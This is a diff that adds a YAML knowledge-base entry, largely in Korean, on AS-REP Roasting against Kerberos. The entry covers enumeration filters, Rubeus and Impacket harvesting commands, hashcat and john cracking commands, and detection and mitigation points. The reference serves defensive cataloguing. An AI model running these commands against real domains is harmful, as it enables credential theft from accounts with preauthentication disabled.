@@ -1,0 +1,106 @@
+# GR Atom: AS-REP Roasting
+# Version: 1.0
+# Created: 2025-01-29
+
+identity:
+  id: "ATK-WIN-ASREP-001"
+  name: "AS-REP Roasting"
+  normalization:
+    normalized_name: "asrep roasting kerberos preauth disabled offline crack"
+    normalization_version: "1.0"
+  aliases:
+    - "AS-REP 로스팅"
+    - "사전 인증 비활성화 공격"
+    - "Kerberos 로스팅"
+
+classification:
+  domain: security
+  type: attack
+  abstraction_level: 2
+  gr_coordinates:
+    layer: "L5"
+    zone: "Zone4"
+    tags: ["ATK", "WIN", "KERBEROS"]
+
+definition:
+  what: |
+    Kerberos 사전 인증이 비활성화된 계정의 AS-REP 응답을 획득하여
+    오프라인으로 패스워드를 크래킹하는 공격이다.
+  why: |
+    사전 인증 없이 암호화된 데이터를 얻는다.
+    오프라인 크래킹으로 패스워드를 획득한다.
+  how: |
+    1. 사전 인증 비활성화 계정 열거
+    2. AS-REQ 요청
+    3. AS-REP 응답 수집
+    4. 오프라인 크래킹
+
+relations:
+  structural:
+    is_a:
+      - "ATK-MITRE-CRED-ACCESS-001"
+    related_to:
+      - "ATK-WIN-KERBEROASTING-001"
+      - "TECH-PROTO-KERBEROS-001"
+
+properties:
+  technical:
+    vulnerability: "DONT_REQUIRE_PREAUTH 플래그"
+    kerberos_flow:
+      - "AS-REQ (사전 인증 없이)"
+      - "AS-REP (암호화된 TGT)"
+      - "오프라인 크래킹"
+    enumeration:
+      ldap_filter: "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
+      powershell: "Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true'"
+    tools:
+      - name: "Rubeus"
+        command: "Rubeus.exe asreproast /nowrap"
+      - name: "Impacket GetNPUsers"
+        command: "GetNPUsers.py corp.local/ -usersfile users.txt"
+      - name: "Hashcat"
+        mode: "18200"
+    hash_format: "$krb5asrep$23$user@DOMAIN:..."
+    cracking:
+      hashcat: "hashcat -m 18200 hashes.txt wordlist.txt"
+      john: "john --format=krb5asrep hashes.txt"
+    detection:
+      - "사전 인증 없는 AS-REQ"
+      - "Event ID 4768 (TGT 요청)"
+      - "대량의 AS-REQ 요청"
+    mitigation:
+      - "사전 인증 활성화"
+      - "강력한 패스워드 정책"
+      - "계정 정기 감사"
+      - "특권 계정 모니터링"
+
+metadata:
+  trust:
+    source: official
+    references:
+      - "MITRE ATT&CK T1558.004"
+      - "HarmJ0y AS-REP Roasting"
+    confidence: 1.0
+    verified:
+      status: verified
+      date: 2025-01-29
+      by: "GR System"
+  temporal:
+    created: 2025-01-29
+    modified: 2025-01-29
+    revision: 1
+  security:
+    sensitivity: public
+  ai:
+    embedding_text: |
+      AS-REP Roasting은 Kerberos 사전 인증이 비활성화된 계정의
+      응답을 오프라인 크래킹하는 공격이다.
+    search_keywords:
+      - "AS-REP"
+      - "Roasting"
+      - "Kerberos"
+      - "사전 인증"
+    related_queries:
+      - "Kerberos 공격"
+      - "패스워드 크래킹"
+      - "AD 공격"
